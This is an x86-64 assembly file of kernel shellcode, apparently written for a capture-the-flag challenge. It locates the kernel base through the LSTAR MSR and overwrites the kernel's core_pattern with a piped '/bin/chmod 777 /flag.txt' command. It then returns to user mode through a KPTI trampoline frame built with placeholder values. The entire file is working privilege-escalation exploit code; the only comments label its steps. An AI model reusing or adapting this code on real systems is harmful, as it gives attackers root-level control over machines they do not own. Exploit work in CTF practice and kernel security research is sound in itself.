.intel_syntax noprefix
.section .data

.set init_cred, 0x1a54c60
.set commit_creds, 0x3298f0
.set core_pattern, 0x1b7f3e0
.set kpti_bypass, 0x1637

.section .text
.global _start

_start:
        /* set rsp at the end of our shellcode page */
        lea rsp, [rip]
        sub rsp, 7
        add rsp, 0xf00
        
        /* kernel base in rdx */
        mov rcx, 0xc0000082
        rdmsr
        shl rdx, 32
        add rdx, rax
        sub rdx, 0x80
        mov r15, rdx 

        /* overwrite with "|chmod 777 /flag.txt" */
        lea rax, [r15 + core_pattern + 0]
        mov rbx, 0x7c
        mov [rax], bl
        lea rax, [r15 + core_pattern + 1]
        mov rbx, 0x2f
        mov [rax], bl
        lea rax, [r15 + core_pattern + 2]
        mov rbx, 0x62
        mov [rax], bl
        lea rax, [r15 + core_pattern + 3]
        mov rbx, 0x69
        mov [rax], bl
        lea rax, [r15 + core_pattern + 4]
        mov rbx, 0x6e
        mov [rax], bl
        lea rax, [r15 + core_pattern + 5]
        mov rbx, 0x2f
        mov [rax], bl
        lea rax, [r15 + core_pattern + 6]
        mov rbx, 0x63
        mov [rax], bl
        lea rax, [r15 + core_pattern + 7]
        mov rbx, 0x68
        mov [rax], bl
        lea rax, [r15 + core_pattern + 8]
        mov rbx, 0x6d
        mov [rax], bl
        lea rax, [r15 + core_pattern + 9]
        mov rbx, 0x6f
        mov [rax], bl
        lea rax, [r15 + core_pattern + 10]
        mov rbx, 0x64
        mov [rax], bl
        lea rax, [r15 + core_pattern + 11]
        mov rbx, 0x20
        mov [rax], bl
        lea rax, [r15 + core_pattern + 12]
        mov rbx, 0x37
        mov [rax], bl
        lea rax, [r15 + core_pattern + 13]
        mov rbx, 0x37
        mov [rax], bl
        lea rax, [r15 + core_pattern + 14]
        mov rbx, 0x37
        mov [rax], bl
        lea rax, [r15 + core_pattern + 15]
        mov rbx, 0x20
        mov [rax], bl
        lea rax, [r15 + core_pattern + 16]
        mov rbx, 0x2f
        mov [rax], bl
        lea rax, [r15 + core_pattern + 17]
        mov rbx, 0x66
        mov [rax], bl
        lea rax, [r15 + core_pattern + 18]
        mov rbx, 0x6c
        mov [rax], bl
        lea rax, [r15 + core_pattern + 19]
        mov rbx, 0x61
        mov [rax], bl
        lea rax, [r15 + core_pattern + 20]
        mov rbx, 0x67
        mov [rax], bl
        lea rax, [r15 + core_pattern + 21]
        mov rbx, 0x2e
        mov [rax], bl
        lea rax, [r15 + core_pattern + 22]
        mov rbx, 0x74
        mov [rax], bl
        lea rax, [r15 + core_pattern + 23]
        mov rbx, 0x78
        mov [rax], bl
        lea rax, [r15 + core_pattern + 24]
        mov rbx, 0x74
        mov [rax], bl
        lea rax, [r15 + core_pattern + 25]
        mov rbx, 0x0
        mov [rax], bl
                
        /* kpti trampoline */
        xor eax, eax
        mov [rsp+0x00], rax
        mov [rsp+0x08], rax
        mov rax, 0x2222222222222222   /* win */
        mov [rsp+0x10], rax
        mov rax, 0x3333333333333333   /* cs */
        mov [rsp+0x18], rax
        mov rax, 0x4444444444444444   /* rflags */
        mov [rsp+0x20], rax
        mov rax, 0x5555555555555555   /* stack */
        mov [rsp+0x28], rax
        mov rax, 0x6666666666666666   /* ss */
        mov [rsp+0x30], rax
        lea rax, [r15 + kpti_bypass]
        jmp rax

        int3
